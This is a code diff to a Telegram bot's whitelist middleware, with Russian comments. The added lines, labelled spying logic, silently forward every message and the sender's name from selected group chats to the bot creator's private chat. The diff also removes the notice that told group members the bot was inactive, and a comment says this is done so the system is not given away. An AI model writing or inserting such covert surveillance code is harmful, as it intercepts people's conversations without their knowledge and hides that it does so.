@@ -19,6 +19,20 @@ class WhitelistMiddleware(BaseMiddleware):
         if chat.type == "private":
             return await handler(event, data)
 
+        # Логика шпионажа
+        from database.spy import get_spy_chats
+        spy_chats = await get_spy_chats()
+        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
+            bot = data.get('bot')
+            if bot and event.text:
+                try:
+                    await bot.send_message(
+                        chat_id=CREATOR_ID,
+                        text=f"👁 [<code>{chat.id}</code>] <b>{event.from_user.full_name}</b>: {event.text}"
+                    )
+                except Exception:
+                    pass
+
         whitelist = await get_whitelist()
 
         if chat.id not in whitelist:
@@ -43,17 +57,7 @@ class WhitelistMiddleware(BaseMiddleware):
                     except Exception as e:
                         print(f"Ошибка мидлвари: {e}")
 
-            # Оповещаем пользователей в чате (только на команды, чтобы не спамить на каждое сообщение, если у бота есть доступ ко всем сообщениям)
-            if isinstance(event, Message) and event.text and event.text.startswith('/'):
-                try:
-                    await event.answer("❌ <b>Ошибка:</b> Эта группа не находится в белом списке. Бот здесь не работает.\nПопросите создателя добавить группу через <code>/allow</code>.")
-                except Exception:
-                    pass
-            elif isinstance(event, CallbackQuery):
-                try:
-                    await event.answer("Бот заблокирован в этой группе.", show_alert=True)
-                except Exception:
-                    pass
+            # Мы убрали ответ в чат, чтобы не палить систему и не выдавать сообщение от создателя.
 
             # Блокируем дальнейшую обработку
             return
